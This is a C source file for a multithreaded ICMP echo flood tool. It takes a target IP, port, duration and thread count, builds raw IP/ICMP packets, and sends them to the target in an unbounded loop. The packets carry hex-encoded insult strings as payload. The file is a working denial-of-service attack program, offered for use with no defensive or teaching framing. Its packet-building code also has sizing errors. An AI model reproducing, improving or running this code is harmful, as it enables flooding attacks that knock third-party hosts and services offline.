#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <pthread.h>
#include <linux/ip.h>
#include <sys/prctl.h>
#include <arpa/inet.h>
#include <linux/icmp.h>

//icmp hex/echo method written in c by juan aka george glaskin

typedef struct atk_args {
    in_addr_t host;

    int port, seconds, psize;
} args_t;

int count = 0;
char **strings;

static void add_string(char *string, int len) {
    strings = realloc(strings, (count + 1) + len);
    strings[count++] = string;
}

static void strings_init(void) { //for easier config
    add_string("\x61\x62\x63\x31\x32\x33", 6);
    add_string("\x6d\x61\x72\x6b\x75\x73\x20\x69\x73\x20\x67\x61\x79", 14);
    add_string("\x75\x72\x30\x61\x20\x69\x73\x20\x61\x20\x73\x6b\x69\x64", 15);
}

static char *strings_rand(void) { //easier config
    return strings[rand() % count];
}

static void atk_watch(int seconds) { //higher pps
    if(!fork()) {
        prctl(PR_SET_PDEATHSIG, SIGTERM);

        sleep(seconds);
        kill(getppid(), 9);
    }
}

static uint16_t checksum_generic(uint16_t *addr, uint32_t count) {
    register unsigned long sum = 0;

    for (sum = 0; count > 1; count -= 2)
        sum += *addr++;
    if (count == 1)
        sum += (char)*addr;

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    
    return ~sum;
}

static void *atk_icmphex(void *arg) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    args_t *args = (args_t *)arg;

    char rdbuf[4096];

    struct iphdr *iph = (struct iphdr *)rdbuf;
    struct icmphdr *icmph = (struct icmphdr *)(rdbuf + sizeof(iph));

    struct sockaddr_in addr = {
        .sin_addr.s_addr = args->host,
        .sin_port = htons(args->port),
        .sin_family = AF_INET
    };

    iph->daddr = addr.sin_addr.s_addr;

    iph->ttl = 128;
    iph->version = 4;
    iph->protocol = IPPROTO_ICMP;
    iph->ihl = 5;
    iph->tos = 0;
    iph->frag_off = 0;
    iph->id = htonl(54321);
    iph->tot_len = sizeof(iph) + sizeof(icmph) + 4096;

    iph->check = 0;
    iph->check = checksum_generic((uint16_t *)iph, iph->tot_len);


    icmph->un.echo.sequence = 0;
    icmph->un.echo.id = rand();
    icmph->type = ICMP_ECHO;
    icmph->code = 0;

    icmph->checksum = 0;
    icmph->checksum = checksum_generic((uint16_t *) (rdbuf + sizeof(struct iphdr)), sizeof(struct icmphdr));

    char *string = strings_rand();
    int len = strlen(string); //also packet size

    memcpy((void *)icmph, string, len);

    atk_watch(args->seconds);

    while(1) {
        sendto(sock, rdbuf, iph->tot_len, MSG_NOSIGNAL, (struct sockaddr *)&addr, sizeof(addr));

        icmph->un.echo.sequence++;
    }
}

int main(int argc, char **argv) {
    if(argc != 5) {
        printf("Usage: invalid args!\r\n%s [ip] [port] [time] [threads]\r\nExample: %s 1.1.1.1 80 20 16\r\n", argv[0], argv[0]);

        return -1;
    }

    in_addr_t host;
    int port, seconds, threads;

    if(!(host = inet_addr(argv[1]))) {
        printf("[main] %s is invalid\r\n", argv[1]);

        return -1;
    }
    else if((port = atoi(argv[2])) > 65535 || port < 1) {
        printf("[main] %s is invalid\r\n", argv[2]);

        return -1;
    }
    else if((seconds = atoi(argv[3])) < 1) {
        printf("[main] %s is invalid\r\n", argv[3]);

        return -1;
    }
    else if((threads = atoi(argv[4])) < 1) {
        printf("[main] %s is invalid\r\n", argv[1]);

        return -1;
    }

    strings_init();

    puts("[main] initiated strings");

    if(threads > 200)
        puts("[warning] threads are high");

    args_t args = {
        .host = host,
        .port = port,
        .seconds = seconds
    };

    pthread_t thread[threads];
    
    for(int i = 0; i < threads; i++)
        pthread_create(&thread[i], NULL, atk_icmphex, (void *)&args);
    
    printf("[main] started: %d threads\n", threads);

    sleep(args.seconds);
}
